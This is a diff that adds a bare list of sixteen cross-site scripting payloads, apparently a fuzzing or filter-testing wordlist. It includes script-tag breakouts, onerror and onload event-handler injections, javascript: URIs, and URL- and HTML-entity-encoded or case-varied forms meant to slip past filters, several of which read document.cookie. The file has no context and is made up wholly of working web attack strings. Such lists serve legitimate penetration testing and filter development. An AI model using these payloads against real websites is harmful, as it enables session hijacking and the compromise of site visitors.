@@ -1,0 +1,16 @@
+</script>"><script>prompt(1)</script>
+</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1/ondrag=co\u006efir\u006d`1`)>XSS</h1>
+'><script>alert(1)</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
